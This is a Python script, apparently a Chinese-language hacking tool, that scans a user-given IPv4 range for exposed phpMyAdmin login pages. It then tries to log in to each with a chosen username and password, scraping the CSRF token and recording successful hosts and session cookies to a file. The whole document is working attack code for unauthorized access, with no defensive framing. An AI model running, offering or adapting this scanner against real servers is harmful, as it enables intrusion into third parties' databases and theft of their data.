#author:九世
#time:2019/3/28

import requests
import re
import threading

chuilist=[]
lock = threading.Lock()
headers = {'user-agent': 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'}

class Baopo:
    def __init__(self,host,host_s,path,username,password):
        self.host=host
        self.host_s=host_s
        self.path=path
        self.username=username
        self.password=password
    def shenc(self):
        zz=re.findall('[0-9]{1,}',self.host)
        zz2=re.findall('[0-9]{1,}',self.host_s)
        for z in range(int(zz[0]),int(zz2[0])+1):
            for c in range(int(zz[1]),int(zz2[1])+1):
                for b in range(int(zz[2]),int(zz2[2])+1):
                    for s in range(int(zz[3]),int(zz2[3])+1):
                        zhi='{}.{}.{}.{}'.format(z,c,b,s)
                        yield zhi
    def chuihuo(self):
        lock.acquire()
        for i in self.shenc():
            try:
                url='http://{}{}/index.php'.format(i,self.path)
                pd=requests.get(url=url,headers=headers,timeout=1)
                if pd.status_code==200:
                    print('[+] 存活phpmyadmin路径的IP:{}'.format(pd.url))
                    chuilist.append(pd.url)
            except:
                pass
        lock.release()
        s=threading.Thread(target=self.bp,args=())
        s.start()
    def bp(self):
        lock.acquire()
        session=requests.session()
        for x in chuilist:
            try:
                qt=session.get(url=x,headers=headers,timeout=1)
                tokens=re.search('[a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9][a-z-0-9]',qt.text)
                data={'pma_username':self.username,'pma_password':self.password,'server':'1','target':'index.php','token':tokens.group()}
                rv=session.post(url=x,headers=headers,data=data)
                if not 'pma_password' in rv.text:
                    print('[+] IP:{} 爆破成功 用户名:{} 密码:{} cookie:{}'.format(rv.url,self.username,self.password,rv.cookies))
                    print('[+] IP:{} 爆破成功 用户名:{} 密码:{}'.format(rv.url,self.username,self.password),file=open('save.txt','a',encoding='utf-8'))
            except Exception as r:
                print('[-] Error {}'.format(r))


        lock.release()

if __name__ == '__main__':
    user=input('请输入起始IP:')
    user2=input('请输入结束IP:')
    user3=input('phpmyadmin路径(例如：/phpmyadmin):')
    user4=input('爆破的用户名:')
    user5=input('爆破的密码:')
    obj=Baopo(user,user2,user3,user4,user5)
    t=threading.Thread(target=obj.chuihuo,args=())
    t.start()